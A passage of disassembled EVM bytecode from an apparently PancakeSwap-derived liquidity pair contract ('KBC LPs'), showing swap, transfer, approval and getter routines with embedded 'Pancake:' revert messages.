PUSH2 0x30B JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x343 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x28C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x80 DUP2 LT ISZERO PUSH2 0x216 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH1 0x40 DUP4 ADD CALLDATALOAD AND SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH1 0x80 DUP2 ADD PUSH1 0x60 DUP3 ADD CALLDATALOAD PUSH5 0x100000000 DUP2 GT ISZERO PUSH2 0x24D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 ADD DUP4 PUSH1 0x20 DUP3 ADD GT ISZERO PUSH2 0x25F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP2 DUP5 PUSH1 0x1 DUP4 MUL DUP5 ADD GT PUSH5 0x100000000 DUP4 GT OR ISZERO PUSH2 0x281 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP SWAP1 SWAP3 POP SWAP1 POP PUSH2 0x69E JUMP JUMPDEST STOP JUMPDEST PUSH2 0x296 PUSH2 0xC7A JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 DUP1 DUP3 MSTORE DUP4 MLOAD DUP2 DUP4 ADD MSTORE DUP4 MLOAD SWAP2 SWAP3 DUP4 SWAP3 SWAP1 DUP4 ADD SWAP2 DUP6 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x2D0 JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0x2B8 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x2FD JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x313 PUSH2 0xC9D JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB SWAP5 DUP6 AND DUP2 MSTORE SWAP3 SWAP1 SWAP4 AND PUSH1 0x20 DUP4 ADD MSTORE PUSH4 0xFFFFFFFF AND DUP2 DUP4 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x60 ADD SWAP1 RETURN JUMPDEST PUSH2 0x36F PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x359 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0xCC7 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 ISZERO ISZERO DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x38B PUSH2 0xCDE JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x28C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x3BD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0xCED JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0xD76 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x36F PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x40D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0xD7C JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0xE16 JUMP JUMPDEST PUSH2 0x43D PUSH2 0xE3A JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0xFF SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x3E5 PUSH2 0xE3F JUMP JUMPDEST PUSH2 0x3E5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x471 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0xE45 JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0xE57 JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0xE5D JUMP JUMPDEST PUSH2 0x28C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4A7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH2 0xE63 JUMP JUMPDEST PUSH2 0x3E5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4C4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0xEB1 JUMP JUMPDEST PUSH2 0x3E5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4EA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x11AF JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0x11C1 JUMP JUMPDEST PUSH2 0x3E5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x518 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x11C7 JUMP JUMPDEST PUSH2 0x54E PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x53E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x11D9 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP3 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB ADD SWAP1 RETURN JUMPDEST PUSH2 0x38B PUSH2 0x157D JUMP JUMPDEST PUSH2 0x38B PUSH2 0x158C JUMP JUMPDEST PUSH2 0x296 PUSH2 0x159B JUMP JUMPDEST PUSH2 0x36F PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x595 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x15BD JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0x15CA JUMP JUMPDEST PUSH2 0x28C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x5C9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x15D0 JUMP JUMPDEST PUSH2 0x38B PUSH2 0x1739 JUMP JUMPDEST PUSH2 0x38B PUSH2 0x1748 JUMP JUMPDEST PUSH2 0x28C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0xE0 DUP2 LT ISZERO PUSH2 0x5FF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0x60 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xFF PUSH1 0x80 DUP3 ADD CALLDATALOAD AND SWAP1 PUSH1 0xA0 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xC0 ADD CALLDATALOAD PUSH2 0x1757 JUMP JUMPDEST PUSH2 0x3E5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x650 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1957 JUMP JUMPDEST PUSH2 0x3E5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x676 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 ADD CALLDATALOAD AND PUSH2 0x1BA6 JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0x1BC3 JUMP JUMPDEST PUSH2 0x28C PUSH2 0x1BC9 JUMP JUMPDEST PUSH1 0x10 SLOAD PUSH1 0x1 EQ PUSH2 0x6E7 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x10 SSTORE DUP5 ISZERO ISZERO DUP1 PUSH2 0x6FA JUMPI POP PUSH1 0x0 DUP5 GT JUMPDEST PUSH2 0x735 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x274E PUSH1 0x23 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x740 PUSH2 0xC9D JUMP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND DUP8 LT DUP1 ISZERO PUSH2 0x765 JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND DUP7 LT JUMPDEST PUSH2 0x7B6 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E53554646494349454E545F4C495155494449545900 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x64 PUSH1 0xA SLOAD DUP12 MUL DUP2 PUSH2 0x7C9 JUMPI INVALID JUMPDEST DIV DUP11 SUB SWAP1 POP PUSH1 0x0 PUSH1 0x64 PUSH1 0xA SLOAD DUP12 MUL DUP2 PUSH2 0x7DE JUMPI INVALID JUMPDEST PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD SWAP3 SWAP1 SWAP2 DIV DUP13 SUB SWAP3 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 DUP2 AND SWAP2 DUP2 AND SWAP1 DUP12 AND DUP3 EQ DUP1 ISZERO SWAP1 PUSH2 0x81E JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP12 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ ISZERO JUMPDEST PUSH2 0x865 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x13 PUSH1 0x24 DUP3 ADD MSTORE PUSH19 0x50616E63616B653A20494E56414C49445F544F PUSH1 0x68 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST DUP13 ISZERO PUSH2 0x876 JUMPI PUSH2 0x876 DUP3 DUP13 DUP7 PUSH2 0x1D29 JUMP JUMPDEST DUP12 ISZERO PUSH2 0x887 JUMPI PUSH2 0x887 DUP2 DUP13 DUP6 PUSH2 0x1D29 JUMP JUMPDEST DUP9 ISZERO PUSH2 0x942 JUMPI DUP11 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x84800812 CALLER DUP7 DUP7 DUP15 DUP15 PUSH1 0x40 MLOAD DUP7 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP7 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 MSTORE PUSH1 0x20 ADD DUP6 DUP2 MSTORE PUSH1 0x20 ADD DUP5 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP5 DUP5 DUP3 DUP2 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP DUP1 DUP3 DUP5 CALLDATACOPY PUSH1 0x0 DUP2 DUP5 ADD MSTORE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND SWAP1 POP DUP1 DUP4 ADD SWAP3 POP POP POP SWAP7 POP POP POP POP POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x929 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x93D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST PUSH1 0x0 PUSH1 0x64 PUSH1 0xA SLOAD DUP16 MUL DUP2 PUSH2 0x952 JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH1 0x0 PUSH1 0x64 PUSH1 0xA SLOAD DUP16 MUL DUP2 PUSH2 0x965 JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP15 ISZERO PUSH2 0x986 JUMPI PUSH1 0x6 SLOAD PUSH2 0x986 SWAP1 DUP6 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP5 PUSH2 0x1D29 JUMP JUMPDEST DUP14 ISZERO PUSH2 0x9A4 JUMPI PUSH1 0x6 SLOAD PUSH2 0x9A4 SWAP1 DUP5 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP4 PUSH2 0x1D29 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x9EA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x9FE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xA14 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP10 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xA60 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xA74 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xA8A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP7 POP PUSH1 0x0 SWAP6 POP POP POP POP POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP6 AND DUP11 SWAP1 SUB DUP4 GT PUSH2 0xAB1 JUMPI PUSH1 0x0 PUSH2 0xAC0 JUMP JUMPDEST DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 SUB JUMPDEST SWAP1 POP PUSH1 0x0 DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 GT PUSH2 0xADD JUMPI PUSH1 0x0 PUSH2 0xAEC JUMP JUMPDEST DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 SUB JUMPDEST SWAP1 POP PUSH1 0x0 DUP3 GT DUP1 PUSH2 0xAFD JUMPI POP PUSH1 0x0 DUP2 GT JUMPDEST PUSH2 0xB38 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x26BE PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xB6C PUSH2 0xB4E DUP5 PUSH1 0x19 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST PUSH2 0xB60 DUP8 PUSH2 0x2710 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xB84 PUSH2 0xB4E DUP5 PUSH1 0x19 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP1 POP PUSH2 0xBB6 PUSH4 0x5F5E100 PUSH2 0xBAA PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP12 DUP2 AND SWAP1 DUP12 AND PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST PUSH2 0xBC6 DUP4 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST LT ISZERO PUSH2 0xC06 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xA PUSH1 0x24 DUP3 ADD MSTORE PUSH10 0x50616E63616B653A204B PUSH1 0xB0 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST POP POP PUSH2 0xC14 DUP5 DUP5 DUP9 DUP9 PUSH2 0x1F76 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP4 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP4 SWAP1 MSTORE DUP1 DUP3 ADD DUP14 SWAP1 MSTORE PUSH1 0x60 DUP2 ADD DUP13 SWAP1 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP12 AND SWAP2 CALLER SWAP2 PUSH32 0xD78AD95FA46C994B6551D0DA85FC275FE613CE37657FB8D5E3D130840159D822 SWAP2 DUP2 SWAP1 SUB PUSH1 0x80 ADD SWAP1 LOG3 POP POP PUSH1 0x1 PUSH1 0x10 SSTORE POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7 DUP2 MSTORE PUSH1 0x20 ADD PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0xB SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP3 PUSH1 0x1 PUSH1 0x70 SHL DUP4 DIV SWAP1 SWAP2 AND SWAP2 PUSH1 0x1 PUSH1 0xE0 SHL SWAP1 DIV PUSH4 0xFFFFFFFF AND SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xCD4 CALLER DUP5 DUP5 PUSH2 0x2139 JUMP JUMPDEST POP PUSH1 0x1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x8 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0xD41 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x12 PUSH1 0x24 DUP3 ADD MSTORE PUSH18 0x2830B731B0B5B29D102327A92124A22222A7 PUSH1 0x71 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x8 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT SWAP2 DUP3 AND OR SWAP1 SWAP2 SSTORE PUSH1 0x9 DUP1 SLOAD SWAP4 SWAP1 SWAP5 AND SWAP3 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SWAP2 SSTORE PUSH1 0xA SSTORE JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE DUP2 KECCAK256 SLOAD PUSH1 0x0 NOT EQ PUSH2 0xE01 JUMPI PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SLOAD PUSH2 0xDDC SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SSTORE JUMPDEST PUSH2 0xE0C DUP5 DUP5 DUP5 PUSH2 0x219B JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 JUMP JUMPDEST PUSH1 0x12 DUP2 JUMP JUMPDEST PUSH1 0x4 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xC SLOAD DUP2 JUMP JUMPDEST PUSH1 0xD SLOAD DUP2 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0xEAC JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x21 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x269D PUSH1 0x21 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0xA SSTORE JUMP JUMPDEST PUSH1 0x0 PUSH1 0x10 SLOAD PUSH1 0x1 EQ PUSH2 0xEFC JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x10 DUP2 SWAP1 SSTORE DUP1 PUSH2 0xF0C PUSH2 0xC9D JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP4 SWAP6 POP SWAP2 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 